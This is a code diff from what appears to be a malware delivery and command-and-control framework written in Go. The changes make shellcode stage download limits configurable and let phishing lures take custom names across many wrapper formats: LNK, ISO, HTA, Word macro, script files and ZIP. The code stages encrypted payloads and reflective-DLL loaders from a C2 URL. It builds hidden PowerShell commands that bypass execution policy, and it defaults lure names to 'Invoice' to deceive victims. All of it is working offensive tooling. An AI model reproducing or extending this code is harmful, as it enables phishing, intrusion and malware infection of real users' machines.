@@ -850,7 +850,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -886,7 +886,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 		// Stage the raw EXE (LOLBins download and execute it directly)
-		exeToken, err := RegisterStage(exePath, "application/octet-stream", 10)
+		exeToken, err := RegisterStage(exePath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage exe: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -945,7 +945,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1005,7 +1005,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1035,6 +1035,14 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		if cfg.StageURL == "" {
 			jsonErr(w, "stage-url required for format="+cfg.Format, http.StatusBadRequest)
 			return
+		}
+		// Derive lure filename stem: LureName → OutputName stem → fallback
+		lnkLure := cfg.LureName
+		if lnkLure == "" && cfg.OutputName != "" {
+			lnkLure = strings.TrimSuffix(cfg.OutputName, filepath.Ext(cfg.OutputName))
+		}
+		if lnkLure == "" {
+			lnkLure = "Invoice"
 		}
 		exePath, err := BuildEXE(cfg, payloadsDir)
 		if err != nil {
@@ -1072,7 +1080,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		encFile.Close()
 		encBinPath := encFile.Name()
 
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1084,7 +1092,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		// Falls back to Add-Type PS loader when no C# compiler is available.
 		var ps string
 		if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
-			runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", 10)
+			runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
 			if err != nil {
 				jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1109,7 +1117,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 
 		switch cfg.Format {
 		case "lnk":
-			lnkPath, err := BuildLNK(psArgs, deliveryDir, "Invoice")
+			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
 			if err != nil {
 				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1119,12 +1127,12 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			s.printf("[%s] build lnk: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
 		case "iso":
-			lnkPath, err := BuildLNK(psArgs, deliveryDir, "Invoice")
+			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
 			if err != nil {
 				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
 				return
 			}
-			isoPath, err := BuildISO(map[string]string{"Invoice.lnk": lnkPath}, "Documents", deliveryDir)
+			isoPath, err := BuildISO(map[string]string{lnkLure + ".lnk": lnkPath}, "Documents", deliveryDir)
 			if err != nil {
 				jsonErr(w, "build iso: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1134,7 +1142,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			s.printf("[%s] build iso: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
 		case "hta":
-			htaPath, err := BuildHTA(ps, deliveryDir, "setup")
+			htaPath, err := BuildHTA(ps, deliveryDir, lnkLure)
 			if err != nil {
 				jsonErr(w, "build hta: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1147,7 +1155,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			// Word macro document — AutoOpen runs the PS loader via WScript.Shell
 			psCmd := fmt.Sprintf("powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -ep Bypass -EncodedCommand %s",
 				utf16LEBase64(ps))
-			docmPath, err := BuildWordMacro(psCmd, "Invoice", deliveryDir)
+			docmPath, err := BuildWordMacro(psCmd, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build docm: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1157,7 +1165,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			s.printf("[%s] build docm: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
 		case "ps1":
-			path, err := BuildPS1(ps, "payload", deliveryDir)
+			path, err := BuildPS1(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build ps1: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1167,7 +1175,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			s.printf("[%s] build ps1: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
 		case "bat":
-			path, err := BuildBAT(ps, "payload", deliveryDir)
+			path, err := BuildBAT(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build bat: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1176,7 +1184,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			result["bin_stage"] = binURL
 
 		case "jscript":
-			path, err := BuildJScript(ps, "payload", deliveryDir)
+			path, err := BuildJScript(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build jscript: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1185,7 +1193,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			result["bin_stage"] = binURL
 
 		case "vbscript":
-			path, err := BuildVBScript(ps, "payload", deliveryDir)
+			path, err := BuildVBScript(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build vbscript: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1194,7 +1202,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			result["bin_stage"] = binURL
 
 		case "sct":
-			path, err := BuildSCT(ps, "payload", deliveryDir)
+			path, err := BuildSCT(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build sct: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1204,7 +1212,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			s.printf("[%s] build sct: stage=%s…\n", op, binURL[:min(len(binURL), 60)])
 
 		case "wsf":
-			path, err := BuildWSF(ps, "payload", deliveryDir)
+			path, err := BuildWSF(ps, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build wsf: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1213,12 +1221,12 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 			result["bin_stage"] = binURL
 
 		case "zip":
-			lnkPath, err := BuildLNK(psArgs, deliveryDir, "Invoice")
+			lnkPath, err := BuildLNK(psArgs, deliveryDir, lnkLure)
 			if err != nil {
 				jsonErr(w, "build lnk: "+err.Error(), http.StatusInternalServerError)
 				return
 			}
-			zipPath, err := BuildZIPLNK(lnkPath, "Invoice", deliveryDir)
+			zipPath, err := BuildZIPLNK(lnkPath, lnkLure, deliveryDir)
 			if err != nil {
 				jsonErr(w, "build zip: "+err.Error(), http.StatusInternalServerError)
 				return
@@ -1259,7 +1267,7 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		}
 		encFile.Close()
 		encBinPath := encFile.Name()
-		binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+		binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage srdi bin: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1734,7 +1742,7 @@ func (s *Server) apiSRDI(w http.ResponseWriter, r *http.Request) {
 			jsonErr(w, "write enc: "+err.Error(), http.StatusInternalServerError)
 			return
 		}
-		token, err := RegisterStage(encPath, "application/octet-stream", 5)
+		token, err := RegisterStage(encPath, "application/octet-stream", 0)
 		if err != nil {
 			jsonErr(w, "stage: "+err.Error(), http.StatusInternalServerError)
 			return
@@ -1952,11 +1960,12 @@ func (s *Server) apiPubIP(w http.ResponseWriter, r *http.Request) {
 
 // DeliverConfig describes a standalone delivery wrapper request.
 type DeliverConfig struct {
-	Wrapper  string `json:"wrapper"`   // lnk|iso|hta|html|ps1|bat|jscript|vbscript|sct|wsf|zip
-	Artifact string `json:"artifact"`  // filename from bin/payloads/ (EXE or BIN)
-	StageURL string `json:"stage_url"` // base C2 URL for shellcode staging
-	LureName string `json:"lure_name"` // lure filename inside the wrapper (no extension)
-	ISOLabel string `json:"iso_label"` // volume label for ISO (default: Documents)
+	Wrapper    string `json:"wrapper"`       // lnk|iso|hta|html|ps1|bat|jscript|vbscript|sct|wsf|zip
+	Artifact   string `json:"artifact"`      // filename from bin/payloads/ (EXE or BIN)
+	StageURL   string `json:"stage_url"`     // base C2 URL for shellcode staging
+	LureName   string `json:"lure_name"`     // lure filename inside the wrapper (no extension)
+	ISOLabel   string `json:"iso_label"`     // volume label for ISO (default: Documents)
+	StageMaxDL int    `json:"stage_max_dl"`  // max downloads per staged file (0 = unlimited)
 }
 
 func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
@@ -2044,7 +2053,7 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	encFile.Close()
 	encBinPath := encFile.Name()
 
-	binToken, err := RegisterStage(encBinPath, "application/octet-stream", 5)
+	binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
 	if err != nil {
 		jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
 		return
@@ -2055,7 +2064,7 @@ func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
 	// Build PS loader (reflective DLL preferred, Add-Type fallback)
 	var ps string
 	if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
-		runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", 10)
+		runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
 		if err != nil {
 			jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
 			return
